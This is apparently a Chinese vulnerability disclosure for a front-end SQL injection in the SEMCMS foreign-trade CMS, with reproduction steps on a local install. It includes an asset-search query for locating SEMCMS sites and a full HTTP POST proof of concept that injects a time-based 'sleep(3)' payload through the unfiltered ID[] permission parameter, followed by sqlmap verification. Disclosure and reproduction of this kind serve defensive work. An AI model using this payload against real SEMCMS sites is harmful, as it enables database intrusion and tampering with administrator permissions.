SEMCMS外贸网站管理系统存在前台sql注入漏洞

 

漏洞概述：

SEMCMS是一个支持多种语言的外贸网站内容管理系统(CMS)，由于权限分配功能处对权限ID参数输入没有过滤，导致存在sql注入漏洞。

官网地址：http://www.sem-cms.com

 

漏洞复现：

app="SEMCMS"

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)

 

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

后台地址路径是部署成功随机生成的，本地复现需要搭建漏洞环境，最新php版本源码地址：官网下载地址

http://www.sem-cms.com/TradeCmsdown/php/semcms_php_4.8.zip

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)

 

ID权限参数拼接sql语句无过滤

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)

（uid参数是用户的ID，本次复现修改管理员的权限，完成测试后修改数据库进行权限恢复,管理员权限参数为74,76,77,87,88,116,123,170,75,78,79,80,81,82,83,84,89,100,181）

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)

构造请求poc

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)

管理员权限被修改为77

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)

拼接sql语句进行注入

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image016.jpg)

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image018.jpg)

 ```
 POST /MtHDbu_Admin/SEMCMS_User.php?CF=fenpei HTTP/1.1
 Host: 192.168.96.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 28
 Origin: http://192.168.96.1
 Connection: close
 Upgrade-Insecure-Requests: 1
 
 ID[]=77'+and+sleep(3)#&uid=1
 ```



 

Sqlmap验证：

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image020.jpg)

测试完成修改数据库管理员权限

74,76,77,87,88,116,123,170,75,78,79,80,81,82,83,84,89,100,181

![img](file:///C:/Users/20922/AppData/Local/Temp/msohtmlclip1/01/clip_image022.jpg)

测试完成（如不想变动管理员权限，复现可创建一个测试用户）

 